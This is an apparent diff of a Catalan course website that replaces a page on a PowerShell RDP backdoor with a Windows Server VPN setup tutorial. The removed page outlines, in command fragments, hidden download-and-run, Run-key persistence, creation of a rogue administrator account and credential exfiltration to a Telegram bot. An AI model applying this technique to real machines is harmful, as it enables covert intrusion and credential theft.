@@ -13,10 +13,8 @@
       
       
       
-        <link rel="prev" href="../unidad4/">
+        <link rel="prev" href="../menuconfig/">
       
-      
-        <link rel="next" href="../kernel/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -24,7 +22,7 @@
     
     
       
-        <title>PowerShell RDP - Administració de Sistemes Operatius</title>
+        <title>Configuració d'una VPN amb Windows - Administració de Sistemes Operatius</title>
       
     
     
@@ -78,7 +76,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#creacio-de-lscript-installps1-desplegament-rdp-remot" class="md-skip">
+        <a href="#vpn-concepte-i-implementacio-en-windows-server" class="md-skip">
           Skip to content
         </a>
       
@@ -111,7 +109,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              PowerShell RDP
+              Configuració d'una VPN amb Windows
             
           </span>
         </div>
@@ -249,13 +247,11 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
-        <a href="./" class="md-tabs__link">
+      <li class="md-tabs__item">
+        <a href="../WindowsRDP/" class="md-tabs__link">
           
   
   
@@ -291,11 +287,13 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
-        <a href="../vpnwindows/" class="md-tabs__link">
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
           
   
   
@@ -509,31 +507,26 @@
       
   
   
-    
   
   
-  
     
     
     
     
-      
-        
-        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
         
           
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
             
   
   
@@ -546,7 +539,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             Contingut Windows
@@ -557,30 +550,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    PowerShell RDP
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../WindowsRDP/" class="md-nav__link">
         
   
   
@@ -591,75 +564,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#creacio-de-lscript-installps1-desplegament-rdp-remot" class="md-nav__link">
-    <span class="md-ellipsis">
-      Creació de l’script install.ps1: Desplegament RDP Remot
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Creació de l’script install.ps1: Desplegament RDP Remot">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#explicacio-generica-de-larquitectura" class="md-nav__link">
-    <span class="md-ellipsis">
-      Explicació Genèrica de l’Arquitectura
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#analisi-tecnica-del-codi-a-titol-informatiu" class="md-nav__link">
-    <span class="md-ellipsis">
-      Anàlisi Tècnica del Codi (A Títol Informatiu)
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#funcionament-del-script-i-proves-captures" class="md-nav__link">
-    <span class="md-ellipsis">
-      Funcionament del Script i Proves (Captures)
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#finalitat-i-consideracions-etiques" class="md-nav__link">
-    <span class="md-ellipsis">
-      Finalitat i Consideracions Ètiques
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -772,26 +676,31 @@
       
   
   
+    
   
   
+  
     
     
     
     
+      
+        
+        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
         
           
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
             
   
   
@@ -804,7 +713,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             VPN Windows
@@ -815,10 +724,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../vpnwindows/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Configuració d'una VPN amb Windows
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -829,6 +760,155 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#que-es-una-vpn" class="md-nav__link">
+    <span class="md-ellipsis">
+      Què és una VPN
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Què és una VPN">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vpn-en-entorns-windows-vs-vpn-convencionals" class="md-nav__link">
+    <span class="md-ellipsis">
+      VPN en entorns Windows vs VPN convencionals
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#infraestructura-i-maquines" class="md-nav__link">
+    <span class="md-ellipsis">
+      Infraestructura i màquines
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuracio-dadreces-ip-estatiques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuració d’adreces IP estàtiques
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#installacio-de-rols-i-caracteristiques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Instal·lació de rols i característiques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Instal·lació de rols i característiques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rols-del-servidor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Rols del servidor
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuracio-denrutament-i-acces-remot-rras" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuració d’Enrutament i Accés Remot (RRAS)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuracio-de-ports-pptp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuració de ports PPTP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#creacio-dusuaris" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creació d’usuaris
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#carpetes-compartides" class="md-nav__link">
+    <span class="md-ellipsis">
+      Carpetes compartides
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuracio-vpn-al-client" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuració VPN al client
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#connexio-i-comprovacions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Connexió i comprovacions
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#monitoratge-de-connexions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Monitoratge de connexions
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -857,148 +937,115 @@
 
 
 
-  <h1>PowerShell RDP</h1>
-
-<h2 id="creacio-de-lscript-installps1-desplegament-rdp-remot">Creació de l’script install.ps1: Desplegament RDP Remot</h2>
-<p>En aquest apartat documentarem la creació d'un script dissenyat per automatitzar una connexió RDP (amb un usuari amb permisos d’administrador) sense intervenció visible per part de l’usuari.</p>
-<p>Per assolir-ho, es crearà l’script principal <strong>install.ps1</strong>.</p>
-<blockquote>
-<p><strong>Nota de Seguretat:</strong> Per mantenir l'enfocament ètic i prevenir l'ús maliciós, <strong>no es pot compartir el codi font complet</strong> d'aquesta implementació. Aquesta documentació és purament informativa i defensiva.</p>
-</blockquote>
-<hr />
-<h3 id="explicacio-generica-de-larquitectura">Explicació Genèrica de l’Arquitectura</h3>
-<p>L’arquitectura es basa en dos scripts de PowerShell: <strong><code>install.ps1</code></strong> (el desplegador) i <strong><code>AdminSetup.ps1</code></strong> (el component principal).</p>
-<table>
-<thead>
-<tr>
-<th style="text-align: left;">Fase</th>
-<th style="text-align: left;">Acció General</th>
-<th style="text-align: left;">Objectiu</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left;"><strong>Instal·lació</strong></td>
-<td style="text-align: left;">Comprova privilegis, crea carpeta local.</td>
-<td style="text-align: left;">Assegurar un entorn d'execució vàlid i amb permisos suficients.</td>
-</tr>
-<tr>
-<td style="text-align: left;"><strong>Descàrrega</strong></td>
-<td style="text-align: left;">Descarrega l'arxiu principal (<code>AdminSetup.ps1</code>) des d’un servidor remot.</td>
-<td style="text-align: left;">Introduir el component de configuració al sistema.</td>
-</tr>
-<tr>
-<td style="text-align: left;"><strong>Persistència</strong></td>
-<td style="text-align: left;">Afegeix una entrada al registre de Windows (Run Key).</td>
-<td style="text-align: left;">Assegurar que el component s'executi automàticament a cada inici de sessió.</td>
-</tr>
-<tr>
-<td style="text-align: left;"><strong>Configuració</strong></td>
-<td style="text-align: left;">Executa el component principal (<code>AdminSetup.ps1</code>).</td>
-<td style="text-align: left;">Aplicar la configuració de RDP i la creació d'usuaris d'administrador.</td>
-</tr>
-<tr>
-<td style="text-align: left;"><strong>Log</strong></td>
-<td style="text-align: left;">Registra un log local amb data, hora i estat.</td>
-<td style="text-align: left;">Mantenir un registre de la instal·lació.</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h3 id="analisi-tecnica-del-codi-a-titol-informatiu">Anàlisi Tècnica del Codi (A Títol Informatiu)</h3>
-<p>L'eficàcia del sistema es basa en la divisió de tasques entre els dos scripts, assegurant que el procés de configuració d'accés remot es realitzi en segon pla i sigui persistent.</p>
-<p><strong>1. Funcions de <code>install.ps1</code> (El Desplegador)</strong></p>
-<table>
-<thead>
-<tr>
-<th style="text-align: left;">Acció Clau</th>
-<th style="text-align: left;">Comanda PowerShell (Resum)</th>
-<th style="text-align: left;">Explicació</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left;"><strong>Descàrrega</strong></td>
-<td style="text-align: left;"><code>Invoke-WebRequest -Uri $URL -OutFile $FilePath</code></td>
-<td style="text-align: left;">Obté el component principal des de l'adreça <code>http://192.168.1.81:8080</code>.</td>
-</tr>
-<tr>
-<td style="text-align: left;"><strong>Persistència</strong></td>
-<td style="text-align: left;"><code>Set-ItemProperty -Path HKLM:\Software\...</code></td>
-<td style="text-align: left;">Crea una clau al registre <strong>Run</strong> (<code>HKLM</code>) per a l'execució automàtica.</td>
-</tr>
-<tr>
-<td style="text-align: left;"><strong>Execució</strong></td>
-<td style="text-align: left;"><code>Start-Process ... -WindowStyle Hidden</code></td>
-<td style="text-align: left;">Inicia el component principal de manera immediata i oculta.</td>
-</tr>
-</tbody>
-</table>
-<p><strong>2. Funcions de <code>AdminSetup.ps1</code> (El Component Principal)</strong></p>
-<table>
-<thead>
-<tr>
-<th style="text-align: left;">Acció Clau</th>
-<th style="text-align: left;">Comanda PowerShell (Resum)</th>
-<th style="text-align: left;">Explicació</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left;"><strong>Usabilitat</strong></td>
-<td style="text-align: left;"><code>New-RandomUsername</code>, <code>New-RandomPassword</code></td>
-<td style="text-align: left;">Genera credencials d'usuari <strong>fortes i aleatòries</strong> per evitar conflictes i garantir la seguretat.</td>
-</tr>
-<tr>
-<td style="text-align: left;"><strong>Privilegis</strong></td>
-<td style="text-align: left;"><code>New-LocalUser</code>, <code>Add-LocalGroupMember -Group "Administrators"</code></td>
-<td style="text-align: left;">Crea un nou usuari i l'afegeix al grup d'<strong>Administradors</strong>.</td>
-</tr>
-<tr>
-<td style="text-align: left;"><strong>RDP</strong></td>
-<td style="text-align: left;"><code>Set-ItemProperty ... "fDenyTSConnections" -Value 0</code></td>
-<td style="text-align: left;">Habilita el servei d'Escriptori Remot (RDP) al registre.</td>
-</tr>
-<tr>
-<td style="text-align: left;"><strong>Exfiltració</strong></td>
-<td style="text-align: left;"><code>Invoke-RestMethod -Uri "$TelegramAPI/sendMessage"</code></td>
-<td style="text-align: left;">Envia les credencials generades, juntament amb la IP i el nom de l'equip, a un <strong>bot de Telegram</strong> predefinit.</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h3 id="funcionament-del-script-i-proves-captures">Funcionament del Script i Proves (Captures)</h3>
-<p>Posem el nostre script en una carpeta d'instal·lació per simular un escenari de desplegament:</p>
-<p><img alt="Carpeta d'instal·lació de l'script amb el fitxer principal i el desplegador" src="../../images/2025-10-25_21-27.png" /></p>
-<p>El codi font (parcialment pixelat per seguretat) gestiona la descàrrega i la persistència.</p>
-<p><img alt="Codi font de l'script install.ps1 (parcialment pixelat) mostrant la connexió al servidor i la creació de persistència." src="../../images/image%20copy%206.png" /></p>
-<p><strong>Prova 1: Instal·lació i Persistència</strong></p>
-<p>Executem l'script dins de PowerShell. Es pot veure que s'executa i crea l'entrada de persistència al registre de Windows.</p>
-<p><img alt="Execució de l'script a PowerShell i verificació de la clau de registre afegida per a l'execució automàtica." src="../../images/2025-10-25_21-29.png" /></p>
-<p>Comprovem el directori i podem veure que l'arxiu principal (<code>AdminSetup.ps1</code>) s'ha descarregat correctament.</p>
-<p><img alt="Comprovació del directori on s'ha descarregat l'arxiu AdminSetup.ps1." src="../../images/2025-10-25_21-29_1.png" /></p>
-<p><strong>Prova 2: Execució i Accés Remot</strong></p>
-<p>Després de reiniciar l'ordinador, el component principal s'executa automàticament, habilita l'RDP, crea l'usuari administrador i, automàticament, envia les credencials.</p>
-<p><img alt="Missatge de Telegram rebut amb les credencials del nou usuari administrador (User, Password, IP)." src="../../images/2025-10-25_22-06.png" /></p>
-<p>Si comprovem els usuaris que s'han creat, hi ha dos nous usuaris (un d'ells l'administrador remot creat per l'script).</p>
-<p><img alt="Llista d'usuaris locals amb els nous comptes creats per l'script." src="../../images/2025-10-25_22-11.png" /></p>
-<p><strong>Prova 3: Connexió Exitosa</strong></p>
-<p>Ens connectem amb un client RDP (en aquest cas, Remmina a Ubuntu) utilitzant les credencials rebudes per Telegram.</p>
-<p><img alt="Connexió RDP amb Remmina utilitzant l'usuari i la contrasenya rebuts al missatge." src="../../images/2025-10-29_17-27.png" /></p>
-<p>I la connexió s'estableix correctament, confirmant l'accés complet.</p>
-<p><img alt="Sessió RDP iniciada correctament al sistema de Windows." src="../../images/2025-10-29_17-28.png" /></p>
-<hr />
-<h2 id="finalitat-i-consideracions-etiques">Finalitat i Consideracions Ètiques</h2>
-<p>L’objectiu principal d'aquest projecte és documentar una tècnica de desplegament que permet que el component de control s’instal·li i s’executi de forma autònoma i persistent sense necessitat d’intervenció manual, garantint un control complet des del costat administratiu.</p>
-<p>Aquesta configuració ofereix un valor considerable en escenaris d'<strong>administració remota i desplegament a gran escala</strong>, especialment:</p>
+<h1 id="vpn-concepte-i-implementacio-en-windows-server">VPN: concepte i implementació en Windows Server</h1>
+<h2 id="que-es-una-vpn">Què és una VPN</h2>
+<p>Una <strong>VPN (Virtual Private Network)</strong> és una tecnologia que permet establir una connexió segura entre un client i una xarxa remota a través d’una xarxa pública, habitualment Internet. Aquesta connexió crea un <strong>túnel xifrat</strong>, garantint la confidencialitat, integritat i autenticació de les dades que hi circulen.</p>
+<h3 id="vpn-en-entorns-windows-vs-vpn-convencionals">VPN en entorns Windows vs VPN convencionals</h3>
+<p>En entorns <strong>Windows Server</strong>, les VPN solen integrar-se amb:</p>
 <ul>
-<li><strong>En Entorns sense Active Directory (AD):</strong> Permet crear mecanismes de <strong>control i accés unificat</strong> en sistemes que no utilitzen una infraestructura centralitzada com AD.</li>
-<li><strong>Automatització:</strong> És una eina potent per a la <strong>desplegament ràpid</strong> de configuracions o la instal·lació de software en llocs de treball remots.</li>
-<li><strong>Control d'Inventari:</strong> Facilita la gestió i el manteniment de sistemes descentralitzats.</li>
+<li><strong>Active Directory</strong></li>
+<li><strong>Polítiques d’accés remot</strong></li>
+<li><strong>Serveis d’enrutament (RRAS)</strong></li>
 </ul>
-<blockquote>
-<p><strong>Ús Ètic i Legal:</strong> Cal destacar que la utilització d'aquest tipus de configuració és útil i legítima només quan s'aplica en entorns controlats i amb <strong>autorització explícita i legal</strong>. El seu ús ha d'estar estrictament dirigit a tasques d'automatització, administració o proves de seguretat sota un marc ètic.</p>
-</blockquote>
+<p>A diferència de les VPN comercials o “convencionals” (com OpenVPN, WireGuard o serveis de tercers), les VPN en Windows Server:</p>
+<ul>
+<li>Permeten <strong>control per usuari</strong></li>
+<li>Integren <strong>autenticació centralitzada</strong></li>
+<li>Faciliten l’accés a <strong>recursos interns</strong> (carpetes compartides, servidors, serveis)</li>
+<li>Són habituals en <strong>entorns corporatius i educatius</strong></li>
+</ul>
+<hr />
+<h2 id="infraestructura-i-maquines">Infraestructura i màquines</h2>
+<p>Disposem d’un <strong>servidor amb dues interfícies de xarxa</strong>:
+- <strong>Interfície externa (simulant ISP):</strong> <code>10.10.1.0/24</code>
+- <strong>Interfície interna:</strong> <code>192.168.2.0/24</code></p>
+<p>El servidor és un <strong>Windows Server 2025</strong> amb <strong>dos discos</strong>.</p>
+<p><img alt="alt text" src="../../images/2025-12-10_17-51_1.png" /></p>
+<hr />
+<h2 id="configuracio-dadreces-ip-estatiques">Configuració d’adreces IP estàtiques</h2>
+<p>Assignem adreces IP estàtiques a les dues interfícies del servidor.</p>
+<p><img alt="alt text" src="../../images/2025-12-10_18-46.png" /></p>
+<p><img alt="alt text" src="../../images/2025-12-10_18-46_1.png" /></p>
+<hr />
+<h2 id="installacio-de-rols-i-caracteristiques">Instal·lació de rols i característiques</h2>
+<p>Des del <strong>Server Manager</strong>, accedim a <em>Eines</em> i seleccionem <strong>Agregar rols i característiques</strong>.</p>
+<p><img alt="alt text" src="../../images/image%20copy%2011.png" /></p>
+<p>Continuem amb l’assistent.</p>
+<p><img alt="alt text" src="../../images/image%20copy%2012.png" /></p>
+<p>A la pantalla inicial, fem clic a <em>Següent</em>.</p>
+<p><img alt="alt text" src="../../images/2025-12-10_18-28.png" /></p>
+<h3 id="rols-del-servidor">Rols del servidor</h3>
+<p>Instal·lem els següents rols:</p>
+<ul>
+<li><strong>Active Directory Domain Services</strong></li>
+<li><strong>Network Policy and Access Services</strong></li>
+<li><strong>Remote Access</strong></li>
+</ul>
+<p><img alt="alt text" src="../../images/2025-12-10_19-11.png" /></p>
+<p>A la següent pantalla, activem:</p>
+<ul>
+<li><strong>DirectAccess and VPN</strong></li>
+<li><strong>Routing</strong></li>
+</ul>
+<p><img alt="alt text" src="../../images/2025-12-10_19-11_1.png" /></p>
+<p>Seguim totes les instruccions de l’assistent fins a completar la instal·lació.</p>
+<hr />
+<h2 id="configuracio-denrutament-i-acces-remot-rras">Configuració d’Enrutament i Accés Remot (RRAS)</h2>
+<p>Accedim a <strong>Enrutament i accés remot</strong>, fem clic dret sobre el servidor i iniciem la configuració.</p>
+<p><img alt="alt text" src="../../images/2025-12-10_19-16.png" /></p>
+<p>Seleccionem l’opció <strong>Accés remot</strong>.</p>
+<p><img alt="alt text" src="../../images/2025-12-10_19-16_1.png" /></p>
+<p>A la següent pantalla, seleccionem <strong>VPN</strong>.</p>
+<p><img alt="alt text" src="../../images/2025-12-10_19-17.png" /></p>
+<p>Indiquem la interfície <strong>externa</strong>, corresponent a <code>10.10.1.1</code>.</p>
+<p><img alt="alt text" src="../../images/2025-12-10_19-17_1.png" /></p>
+<p>Configurem manualment un <strong>pool d’adreces IP</strong> per als clients VPN.</p>
+<p><img alt="alt text" src="../../images/image.png" /></p>
+<p>Finalitzem l’assistent i esperem que el servei s’iniciï correctament.</p>
+<hr />
+<h2 id="configuracio-de-ports-pptp">Configuració de ports PPTP</h2>
+<p>Aquest pas és essencial. Dins de <strong>Enrutament i accés remot → Ports</strong>, fem clic dret i configurem el port <strong>PPTP</strong>, assignant <strong>10 ports disponibles</strong>.</p>
+<p><img alt="alt text" src="../../images/2025-12-11_17-25.png" /></p>
+<hr />
+<h2 id="creacio-dusuaris">Creació d’usuaris</h2>
+<p>Creem usuaris <strong>locals o d’Active Directory</strong>, segons la configuració del servidor.</p>
+<p>En aquest cas, es creen dos usuaris:
+- <strong>Vitaliy</strong>
+- <strong>Anna</strong></p>
+<p><img alt="alt text" src="../../images/image%20copy%2013.png" /></p>
+<p>A cada usuari se li habilita l’opció <strong>Allow remote access</strong>.</p>
+<p><img alt="alt text" src="../../images/2025-12-10_19-26.png" /></p>
+<hr />
+<h2 id="carpetes-compartides">Carpetes compartides</h2>
+<p>Al <strong>disc secundari</strong> del servidor, creem directoris personals per a cada usuari i els compartim amb permisos individuals.</p>
+<ul>
+<li>Carpeta <em>Vitaliy</em></li>
+<li>Carpeta <em>Anna</em></li>
+</ul>
+<p><img alt="alt text" src="../../images/image%20copy%2014.png" /></p>
+<p><img alt="alt text" src="../../images/image%20copy%2017.png" /></p>
+<hr />
+<h2 id="configuracio-vpn-al-client">Configuració VPN al client</h2>
+<p>Al client, accedim a la configuració de xarxa, cerquem <strong>VPN</strong> i seleccionem <em>Afegir una VPN</em>.</p>
+<p>Configurem una connexió per a l’usuari <strong>Vitaliy</strong>.</p>
+<p><img alt="alt text" src="../../images/image%20copy%2015.png" /></p>
+<p>I una altra per a <strong>Anna</strong>.</p>
+<p><img alt="alt text" src="../../images/image%20copy%2016.png" /></p>
+<hr />
+<h2 id="connexio-i-comprovacions">Connexió i comprovacions</h2>
+<p>Ens connectem amb l’usuari <strong>Anna</strong> i comprovem que la connexió VPN s’estableix correctament.</p>
+<p><img alt="alt text" src="../../images/2025-12-11_18-59.png" /></p>
+<p>Verifiquem que l’adreça IP ha canviat.</p>
+<p><img alt="alt text" src="../../images/2025-12-11_17-21.png" /></p>
+<p>Accedim al directori compartit de <strong>Anna</strong> i comprovem que hi tenim accés.</p>
+<p><img alt="alt text" src="../../images/image%20copy%2018.png" /></p>
+<p>Si intentem accedir al directori de <strong>Vitaliy</strong> amb l’usuari Anna, l’accés és denegat per manca de permisos.</p>
+<p><img alt="alt text" src="../../images/image%20copy%2019.png" /></p>
+<hr />
+<h2 id="monitoratge-de-connexions">Monitoratge de connexions</h2>
+<p>Des del servidor, a <strong>Clients d’accés remot</strong>, podem observar les connexions actives de <strong>Anna</strong> i <strong>Vitaliy</strong>.</p>
+<p><img alt="alt text" src="../../images/image%20copy%2020.png" /></p>
+<p><img alt="alt text" src="../../images/2025-12-11_17-24.png" /></p>
 
 
 
